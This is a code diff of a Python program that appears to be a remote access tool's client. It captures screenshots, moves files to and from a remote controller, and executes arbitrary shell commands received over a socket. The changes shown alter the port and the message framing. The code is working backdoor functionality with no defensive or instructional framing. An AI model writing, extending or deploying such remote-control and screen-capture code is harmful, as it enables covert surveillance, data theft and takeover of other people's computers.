@@ -5,14 +5,9 @@ import time
 import subprocess
 import mss
 
-#TODO:
-#Error handing
-    # Shell cmds
-    # File management
 
 
-
-address = ("0.0.0.0", 3232)
+address = ("0.0.0.0", 3000)
 
 def take_screen_shot():
     if len(mss.mss().monitors) > 0:
@@ -20,22 +15,26 @@ def take_screen_shot():
         img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
         send(img_data)
 
-        del(raw_pixels, img_data)
+    else:
+        send(b'')
 
 def recv(buff_size=1024):
-    data_size = int(server_con.recv(12).decode())
+    data_size = int(server_con.recv(12).decode().rstrip())
 
-    data = bytes()
-    while len(data) < data_size:
-        data += server_con.recv(buff_size)
+    if not data_size:
+        return None
 
-    return data
+    data_buff = bytes()
+    while len(data_buff) < data_size:
+        data_buff += server_con.recv(buff_size)
+
+    return data_buff
 
 def send(data):
     header_size = 12
-    data_size = f"{len(data):^{header_size}}"
-    server_con.send(data_size.encode())
-    server_con.sendall(data)
+    data_size = f"{len(data):<{header_size}}"
+    server_con.sendall(data_size.encode()+data)
+
 
 def upload_file(file_name):
     try:
@@ -43,7 +42,6 @@ def upload_file(file_name):
             file_data = file.read()
             send(file_data)
 
-        is_done = recv().decode()
     except:
         print("Error opening file")
         send(b'')
@@ -53,11 +51,12 @@ def download_file(file_name, file_path):
     if not file_data:
         print("Could not download file...")
         return
+
     try:
         file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
         file.write(file_data)
         file.close()
-        send(b"DONE")
+
     except OSError as e:
         print(e)
 
@@ -81,7 +80,7 @@ def open_shell():
             except FileNotFoundError as e:
                 str_msg = str(e).encode()
             else:
-                str_msg = os.getcwd().encode()+"\n"
+                str_msg = os.getcwd().encode() + b"\n"
 
         elif cmd[:2] == "dw":
             file_name = cmd[3:]
@@ -98,6 +97,8 @@ def open_shell():
         else:
             output = subprocess.Popen(f'{cmd}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
             str_msg = output[0] + output[1]
+
+
 
         send(str_msg)
 
